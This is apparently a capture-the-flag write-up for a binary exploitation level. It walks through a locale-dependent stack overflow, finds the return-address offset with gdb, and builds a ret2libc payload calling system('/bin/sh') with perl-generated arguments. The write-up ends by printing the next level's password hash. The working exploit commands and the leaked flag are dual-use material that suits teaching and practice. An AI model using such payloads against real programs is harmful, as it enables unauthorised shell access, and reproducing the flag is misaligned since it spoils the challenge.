# bonus3

In this level, the program is not the same if we change the `LANG` env var:
```
export LANG=en_US.UTF-8
export LANG=fi_FI.UTF-8
export LANG=nl_NL.UTF-8
```

If we analyse a little the program, we can see that with the `export LANG=fi_FI.UTF-8`, we can show the EIP at an offset of 18 on the second string

```bash
> export LANG=fi_FI.UTF-8
> gdb bonus2
(gdb) $ run "0123456789012345678901234567890123456789" "AAA~AAA}AAA|AAA{AAAzAAAyAAAxAAAwAAAvAAAuAAAtAAAsAAArAAAqAAApAAAoAAAnAAAmAAAlAAAkAAAjAAAiAAAhAAAgAAAf"
...
(segfault) -> Invalid $PC address: 0x41417a41
EIP: 0x41417a41 ('AzAA') -> offset: 18 (./pattern.py search "AzAA")
```

We can call any function with this feature, let's try to find the `system` function
```bash
> gdb bonus2
(gdb) $ b main
(gdb) $ run
(gdb) $ info function system  # need to call it while runningn
0xb7e6b060  system
```

We can call system with this command
```bash
./bonus2 "`perl -e 'print "A"x40'`" "`perl -e 'print "B"x18 . "\x60\xb0\xe6\xb7"'`"
```
The `call system` is after `ret` of `greetuser` function

Now we know that the first argument of call system is the first argument + 3: `./run AA...A<arg-system>AA...A B*18<system-addr>
The arg is `/bin/sh`, try to find this:
```bash
> gdb bonus2
(gdb) $ b main
(gdb) $ run
(gdb) $ find "/bin/sh"
libc : 0xb7f8cc58 ("/bin/sh")
```

Now we have the argument to send to `system`
```bash
> export LANG=fi_FI.UTF-8
> ./bonus2 "`perl -e 'print "\x58\xcc\xf8\xb7"x10'`" "`perl -e 'print "C"x18 . "\x60\xb0\xe6\xb7"'`"
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

```
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
